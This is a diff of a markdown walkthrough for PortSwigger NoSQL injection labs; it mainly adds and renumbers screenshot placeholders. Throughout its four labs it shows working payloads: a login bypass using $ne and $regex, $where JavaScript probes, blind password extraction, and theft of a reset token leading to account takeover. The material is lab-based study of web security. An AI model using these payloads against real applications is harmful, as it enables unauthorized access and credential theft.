@@ -34,11 +34,19 @@ The `POST /login` handler builds a MongoDB query from JSON, so we can inject ope
 { "username": {"$ne": ""}, "password": "peter" }
 ```
 
+> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `{ "username": {"$ne": ""}, "password": "peter" }`.
+> _Save as_ `images/portswigger-nosql-injection-labs/2.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/2.png)`_._
+
+
 Login succeeds. The regex operator also works:
 
 ```json
 { "username": {"$regex": "wien.*"}, "password": "peter" }
 ```
+
+> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `{ "username": {"$regex": "wien.*"}, "password": "peter" }`.
+> _Save as_ `images/portswigger-nosql-injection-labs/3.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/3.png)`_._
+
 
 3. Now target the admin. With `password` set to `{"$ne":""}` the query returns multiple users (an anomaly). Combine it with an admin regex:
 
@@ -46,16 +54,20 @@ Login succeeds. The regex operator also works:
 { "username": {"$regex": "admin.*"}, "password": {"$ne": ""} }
 ```
 
+> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `{ "username": {"$regex": "admin.*"}, "password": {"$ne": ""} }`.
+> _Save as_ `images/portswigger-nosql-injection-labs/4.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/4.png)`_._
+
+
 4. This logs you in as the administrator.
 
-> **Picture goes here (#2).** The `{"$regex":"admin.*"}` + `{"$ne":""}` login request and the admin session.
-> _Save as_ `images/portswigger-nosql-injection-labs/2.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/2.png)`_._
+> **Picture goes here (#5).** The `{"$regex":"admin.*"}` + `{"$ne":""}` login request and the admin session.
+> _Save as_ `images/portswigger-nosql-injection-labs/5.png` _then replace this block with_ `![Lab 1 — Exploiting NoSQL operator injection to bypass authentication](/images/portswigger-nosql-injection-labs/5.png)`_._
 
 **Why it works:** the server passes the JSON straight into the query, so `$ne` / `$regex` change the query's meaning instead of being treated as literal text.
 
 ## Lab 2 — Exploiting NoSQL injection to extract data (detection)
-> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Gifts'+'`.
-> _Save as_ `images/portswigger-nosql-injection-labs/3.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/3.png)`_._
+> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Gifts'+'`.
+> _Save as_ `images/portswigger-nosql-injection-labs/6.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/6.png)`_._
 
 
 **Difficulty:** Apprentice
@@ -71,6 +83,10 @@ The product category filter is concatenated into a MongoDB `$where` JavaScript e
 Gifts'+'
 ```
 
+> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `Gifts'+'`.
+> _Save as_ `images/portswigger-nosql-injection-labs/7.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/7.png)`_._
+
+
 No error → server-side JS is being evaluated.
 4. Boolean probes:
 
@@ -79,20 +95,28 @@ Gifts' && 0 && 'x      → no products (false)
 Gifts' && 1 && 'x      → Gifts products (true)
 ```
 
+> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `Gifts' && 0 && 'x      → no products (false)`.
+> _Save as_ `images/portswigger-nosql-injection-labs/8.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/8.png)`_._
+
+
 5. Force a true condition to reveal unreleased products:
 
 ```text
 Gifts'||1||'
 ```
 
+> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `Gifts'||1||'`.
+> _Save as_ `images/portswigger-nosql-injection-labs/9.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/9.png)`_._
+
+
 Load the response in the browser to confirm and solve.
 
-> **Picture goes here (#4).** The syntax error, the boolean probes, and `Gifts'||1||'` returning hidden products.
-> _Save as_ `images/portswigger-nosql-injection-labs/4.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/4.png)`_._
+> **Picture goes here (#10).** The syntax error, the boolean probes, and `Gifts'||1||'` returning hidden products.
+> _Save as_ `images/portswigger-nosql-injection-labs/10.png` _then replace this block with_ `![Lab 2 — Exploiting NoSQL injection to extract data (detection)](/images/portswigger-nosql-injection-labs/10.png)`_._
 
 ## Lab 3 — Exploiting NoSQL injection to extract data (blind)
-> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `administrator' && this.password.length < 30 || 'a'=='b`.
-> _Save as_ `images/portswigger-nosql-injection-labs/5.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/5.png)`_._
+> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `administrator' && this.password.length < 30 || 'a'=='b`.
+> _Save as_ `images/portswigger-nosql-injection-labs/11.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/11.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -107,6 +131,10 @@ The `GET /user/lookup?user=` endpoint injects into a `$where` clause.
 administrator' && this.password.length < 30 || 'a'=='b
 ```
 
+> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `administrator' && this.password.length < 30 || 'a'=='b`.
+> _Save as_ `images/portswigger-nosql-injection-labs/12.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/12.png)`_._
+
+
 Decrease the number until it flips: it is **8** characters.
 3. Extract each character with Intruder (Cluster bomb), two payload positions:
 
@@ -114,18 +142,22 @@ Decrease the number until it flips: it is **8** characters.
 administrator' && this.password[§0§]=='§a§
 ```
 
+> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `administrator' && this.password[§0§]=='§a§`.
+> _Save as_ `images/portswigger-nosql-injection-labs/13.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/13.png)`_._
+
+
 - Position 1: numbers `0`–`7`.
 - Position 2: letters `a`–`z`.
 - Sort by payload 1 then response length; the request that returns the administrator's details reveals each character.
 
 4. Log in as administrator with the recovered password.
 
-> **Picture goes here (#6).** The length probe and the Intruder results revealing each character.
-> _Save as_ `images/portswigger-nosql-injection-labs/6.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/6.png)`_._
+> **Picture goes here (#14).** The length probe and the Intruder results revealing each character.
+> _Save as_ `images/portswigger-nosql-injection-labs/14.png` _then replace this block with_ `![Lab 3 — Exploiting NoSQL injection to extract data (blind)](/images/portswigger-nosql-injection-labs/14.png)`_._
 
 ## Lab 4 — Exploiting NoSQL operator injection to extract unknown fields
-> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`.
-> _Save as_ `images/portswigger-nosql-injection-labs/7.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/7.png)`_._
+> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`.
+> _Save as_ `images/portswigger-nosql-injection-labs/15.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/15.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -138,11 +170,19 @@ administrator' && this.password[§0§]=='§a§
 {"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
 ```
 
+> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`.
+> _Save as_ `images/portswigger-nosql-injection-labs/16.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/16.png)`_._
+
+
 → "Invalid username or password" (false).
 
 ```json
 {"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}
 ```
+
+> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}`.
+> _Save as_ `images/portswigger-nosql-injection-labs/17.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/17.png)`_._
+
 
 → "Account locked" (true). The JavaScript is evaluated.
 3. Enumerate the keys on the user object with Intruder (Cluster bomb):
@@ -150,6 +190,10 @@ administrator' && this.password[§0§]=='§a§
 ```json
 "$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
 ```
+
+> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`.
+> _Save as_ `images/portswigger-nosql-injection-labs/18.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/18.png)`_._
+
 
 - Position 1: numbers (0–20).
 - Position 2: `a–z`, `A–Z`, `0–9`.
@@ -161,10 +205,14 @@ administrator' && this.password[§0§]=='§a§
 "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
 ```
 
+> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`.
+> _Save as_ `images/portswigger-nosql-injection-labs/19.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/19.png)`_._
+
+
 6. Submit it: `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`, change Carlos's password, log in as `carlos`.
 
-> **Picture goes here (#8).** The `$where` true/false probes, the key enumeration, and the recovered reset token.
-> _Save as_ `images/portswigger-nosql-injection-labs/8.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/8.png)`_._
+> **Picture goes here (#20).** The `$where` true/false probes, the key enumeration, and the recovered reset token.
+> _Save as_ `images/portswigger-nosql-injection-labs/20.png` _then replace this block with_ `![Lab 4 — Exploiting NoSQL operator injection to extract unknown fields](/images/portswigger-nosql-injection-labs/20.png)`_._
 
 **Why it works:** `$where` evaluates attacker-supplied JavaScript in the database, letting you introspect object keys and values even when no data is returned directly.
 
